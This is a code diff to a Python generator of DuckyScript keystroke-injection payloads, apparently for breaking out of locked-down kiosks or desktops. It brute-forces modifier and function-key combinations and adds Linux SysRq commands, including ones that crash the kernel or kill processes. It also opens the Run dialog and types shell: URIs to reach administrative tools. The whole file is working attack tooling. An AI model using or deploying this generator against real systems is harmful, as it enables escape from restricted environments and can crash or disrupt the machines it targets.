@@ -3,23 +3,30 @@ MODIFIERS = [
     ['ALT'],
     ['CTRL', 'ALT'],
     ['CTRL', 'SHIFT'],
-    ['FN'],
-    ['FN', 'SHIFT'],
-    ['WINDOWS'],
-    ['WINDOWS', 'SHIFT'],
+    ['GUI'],  
+    ['GUI', 'SHIFT'],
     ['ALT', 'SHIFT'],
-    ['ALT', 'WINDOWS']
+    ['ALT', 'GUI'],
+    ['CTRL', 'ALT', 'SHIFT'],
+    ['CTRL', 'GUI'],
+    ['CTRL', 'GUI', 'SHIFT']
 ]
 
 COMMON_KEYS = (
     [chr(c) for c in range(ord('a'), ord('z') + 1)] +
     [str(d) for d in range(0, 10)] +
-    [
-        'ESCAPE', 'ESC', 'TAB', 'ENTER', 'SPACE',
-        'DELETE', 'BACKSPACE', 'INSERT', 'HOME', 'END', 'NUMLOCK', 'MENU', 'PRINTSCREEN', 
-        'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'
+    ['ESCAPE', 'ESC', 'TAB', 'ENTER', 'SPACE','DELETE', 'BACKSPACE', 'INSERT', 'HOME', 'END', 'MENU', 'PRINTSCREEN','BREAK', 'PAUSE','PAGEUP', 'PAGEDOWN','UPARROW', 'DOWNARROW', 'LEFTARROW', 'RIGHTARROW','UP', 'DOWN', 'LEFT', 'RIGHT','F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12'
     ]
 )
+
+MEDIA_KEYS = ['EXIT','HOME', 'BACK', 'FORWARD', 'REFRESH', 'SNAPSHOT','PLAY', 'PAUSE', 'PLAY_PAUSE', 'NEXT_TRACK', 'PREV_TRACK','STOP', 'EJECT', 'MUTE', 'VOLUME_UP', 'VOLUME_DOWN','FN'
+]
+
+MOUSE_COMMANDS = ['LEFTCLICK', 'RIGHTCLICK'
+]
+
+STANDALONE_SPECIAL = ['PRINTSCREEN', 'BREAK', 'PAUSE', 'INSERT'
+]
 
 altstring_payloads = [
     "shell:Administrative Tools",
@@ -84,28 +91,65 @@ altstring_payloads = [
     "ftp://"
 ]
 
-
 def combo_to_ducky(combo):
     return ' '.join(combo)
 
 def generate(output_path='breakout_payload.txt'):
     with open(output_path, 'w') as f:
-        # change default delay 
-        f.write("DEFAULT_DELAY 50\n")
-
+        
+        f.write("DEFAULT_DELAY 200\n")
+        
+        
         f.write("\nREM === Modifier Brute Force Combos ===\n")
         for mod in MODIFIERS:
             for key in COMMON_KEYS:
-                full_combo = mod + [key if len(key) == 1 and key.isalpha() else key]
+                full_combo = mod + [key]
                 f.write(combo_to_ducky(full_combo) + '\n')
+        
+        
+        f.write("\nREM === Standalone Special Keys ===\n")
+        for key in STANDALONE_SPECIAL:
+            f.write(key + '\n')
+        
+        
+        f.write("\nREM === Media Keys ===\n")
+        for media_key in MEDIA_KEYS:
+            f.write(f"MEDIA {media_key}\n")
+        
+        
+        f.write("\nREM === Media Keys with Modifiers ===\n")
+        for mod in MODIFIERS:
+            for media_key in MEDIA_KEYS:
+                f.write(combo_to_ducky(mod) + f" MEDIA {media_key}\n")
+        
+        f.write("\nREM === Mouse Commands ===\n")
+        for mouse_cmd in MOUSE_COMMANDS:
+            f.write(mouse_cmd + '\n')
+        
+        f.write("\nREM === Globe Key Combinations (Mac) ===\n")
+        for key in COMMON_KEYS[:26]:  
+            f.write(f"GLOBE {key}\n")
+        
+        f.write("\nREM === SysRq Commands (Linux) ===\n")
+        sysrq_chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',  'c',  'd',  
+                       'e',  'f',  'g',  'h',  'i',  'j',  'k',  'l',  'm',  'n',  
+                       'p',  'q',  'r',  's',  't',  'u',  'v',  'w',  'x',  'z',  \
+                        'D',  'R',  'S'   
+        ]
 
+        for char in sysrq_chars:
+            f.write(f"SYSRQ {char}\n")
+        
+        f.write("\nREM === Shift Spam ===\n")
         for _ in range(5):
             f.write("SHIFT\n")
-
+    
+        f.write("\nREM === ALTSTRING Payloads ===\n")
         for string in altstring_payloads:
-            result = "ALTSTRING " + string + "\n"
-            f.write(result)
-        
+            f.write(f"GUI r\n")
+            f.write(f"ALTSTRING {string}\n")
+            f.write(f"ENTER\n")
+            
 
 if __name__ == "__main__":
     generate()
